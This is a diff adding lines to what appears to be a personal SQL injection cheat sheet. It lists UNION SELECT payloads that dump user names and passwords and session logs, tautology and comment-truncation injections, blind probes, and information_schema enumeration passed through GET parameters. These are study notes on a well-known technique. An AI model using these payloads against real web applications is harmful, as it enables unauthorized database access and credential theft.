@@ -111,6 +111,30 @@ GET METHOD
 4 CRAFT QUERY                                  SELECTION=2 UNION SELECT start,status,last_access from session.session_log
                                                 SELECTION=2 UNION SELECT id,name,pass from session.user
 
+Nesting statements
+## Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.
+  UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
+
+ignore the rest
+  Using # or -- tells the Database to ignore everything after
+  Input to Inject: 1 or 1=1; #   #-part of the syntax
+
+
+Blind injection for validation:
+  php?item=4 OR 1=1
+  Try ALL combinations! item=1, item=2, item=3, etc.
+
+Abuse The Client (GET METHOD)
+Passing injection through the URL:
+After the .php?item=4 pass your UNION statement
+prices.php?item=4 UNION SELECT 1,2
+prices.php?item=4 UNION SELECT 1,2,@@version
+
+Abuse The Client (Enum)
+  php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()
+
+
+
 
 
 
